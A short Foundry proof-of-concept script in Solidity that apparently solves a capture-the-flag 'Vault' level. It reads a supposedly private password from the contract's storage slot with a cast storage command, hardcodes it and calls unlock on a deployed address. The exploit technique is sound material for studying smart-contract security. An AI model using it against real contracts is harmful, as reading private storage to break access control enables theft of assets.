// SPDX-LIcense-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/8_Vault.sol";

contract POC is Script {
    Vault public target;
    bytes32 public password;

    function setUp() external {
        target = Vault(0xA355381505185E24d846a092D1e84d375713A16C);
        // cast storage 0xA355381505185E24d846a092D1e84d375713A16C 1 --rpc-url $RPC_URL
        password = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;
    }

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bool locked = target.locked();
        console.log("before status: ", locked);
        
        target.unlock(password);

        locked = target.locked();
        console.log("after  status: ", locked);

        vm.stopBroadcast();
    }
}